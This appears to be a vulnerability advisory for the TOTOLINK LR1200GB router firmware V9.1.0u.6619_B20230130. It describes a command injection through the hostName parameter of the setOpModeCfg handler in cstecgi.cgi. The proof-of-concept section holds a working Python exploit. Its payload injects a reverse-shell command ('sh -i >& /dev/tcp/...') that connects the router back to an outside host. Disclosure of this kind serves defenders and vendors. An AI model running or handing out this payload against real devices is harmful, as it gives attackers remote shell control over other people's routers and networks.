# TOTOLINK LR1200GB(V9.1.0u.6619_B20230130) router has command injection vulnerability
## Information

Vendor：http://totolink.net/

Firmware：https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/233/ids/36.html

## Affected Version
V9.1.0u.6619_B20230130
## Vulnerability Analysis
The following images displays the code for a command injection vulnerability in the `setOpModeCfg` handler function of  `cstecgi.cgi`. The call chain is `sub_42eac8` -> `sub_42635c` -> `sub_4250b8`.Here's the constraints:
1. the value of `opmode` parameter !="gw"
2. the value of `proto` parameter !=6

At the end, the value of the `hostName` parameter will be spliced ​​into the `echo '%s' > /pro....` and be excuted by `doSystem` function, which allows an attacker to excute any command.

`sub_42eac8` func:
![code3](./code3.png)
![code4](./code4.png)

`sub_42635c` func:
![code5](./code5.png)

`proto` parameter in `sub_4250b8` func 
![code2](./code2.png)

`hostName` parameter in `sub_4250b8` func , 
![code1](./code.png)
## POC
```python
import requests

url = "http://192.168.0.1/cgi-bin/cstecgi.cgi"

payload = {
    "opmode": "xxxx",
    "proto": "9",
    "hostName": "';sh -i >& /dev/tcp/192.168.109.129/9001 0>&1;#",
    "switchOpMode": "1",
    "topicurl": "setOpModeCfg",
    "token": "00000000000000000000000000000000"
}

requests.request("POST", url, data=payload)
```
![postman](postman.png)
